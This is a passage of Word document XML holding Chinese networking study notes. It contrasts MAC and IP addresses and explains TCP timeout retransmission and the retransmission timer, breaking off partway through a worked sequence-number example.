      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>曲</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>地址是一个硬件地址，用来定义网絡设备的位置，主要由数据链路层负责。而</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ip </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>地址是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>协议提供的一种统一的地址格弍，为互联网上的每一个网络和每一台主机分 配一个逻辑地址，以此来屏蔽物理地址的差异。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="288" w:name="bookmark297"/>
      <w:bookmarkStart w:id="289" w:name="bookmark298"/>
      <w:bookmarkStart w:id="290" w:name="bookmark299"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>46.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>超时重</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>传机制</w:t>
      </w:r>
      <w:bookmarkEnd w:id="288"/>
      <w:bookmarkEnd w:id="289"/>
      <w:bookmarkEnd w:id="290"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
        <w:sectPr>
          <w:headerReference r:id="rId24" w:type="default"/>
          <w:headerReference r:id="rId25" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1505" w:right="1706" w:bottom="1460" w:left="1688" w:header="0" w:footer="1032" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>超时重传是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>保证数据传输可靠性的又一大措施，本文主要介绍重传</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>报文的两大</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>举措：超时重传和快速重传</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>超时重传机制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>超时重传指的是，发送数据包在一定的时间周期内没有收到相应的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>等待一定的时 间，超时之后就认为这个数据包丢失，就会重新发送。这个等待时间被称为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Rm.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>检测丢失</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>segment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的方法从概念上讲还是比较简单的，每一次开始发送一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>TCP segment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的时候，就启动重传定时器，定时器的时间一开始是一个预设的值</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>（Linux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>规 定为姑），随着通讯的变化以及时间的推移，这个定时器的溢出值是不断的在变化的, 有相关算法计算</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">RTO </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>［参考：文章如果在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>收到之前，定时器到期，协议栈就 会认为这个片段被丢失，重新传送数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">在实现重传机制的时候，需要保证能够在同一时刻有效的处理多个没有被确认的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>也保证在合适的时候对每一个片段进行重传，有这样几点原则：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="291" w:name="bookmark300"/>
      <w:bookmarkEnd w:id="291"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这些被发送的片段放在一个窗口中，等待被确认，没有确认不会从窗口中移走，定 时器在重传时间到期内，每个片段的位置不变，这个地方其实在滑动窗口的时候也有提 到过</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="700"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="292" w:name="bookmark301"/>
      <w:bookmarkEnd w:id="292"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>.只有等到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>收到的时候，变成发送并</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的片段，才会被从窗口中移走。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="700"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="293" w:name="bookmark302"/>
      <w:bookmarkEnd w:id="293"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>.如果定时器到期没有收到对应</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就重传这个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>TCP segment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>重传之后也没有办法完全保证，数据段一定被收到，所以仍然会重置定时器，等待</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ACK, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>如果定时器到期还是没有收到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>继续重传，这个过程重传的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">TCP segment </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>-直留着 队列之内。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>举个重传的例子：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="294" w:name="bookmark303"/>
      <w:bookmarkEnd w:id="294"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Server </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">发送80 个字节 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Parti, seq </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>= 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="295" w:name="bookmark304"/>
      <w:bookmarkEnd w:id="295"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Server </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">发送 120 个字节 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Part2, Seq </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>- 81</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="296" w:name="bookmark305"/>
      <w:bookmarkEnd w:id="296"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Server</w:t>
      </w:r>
      <w:r>
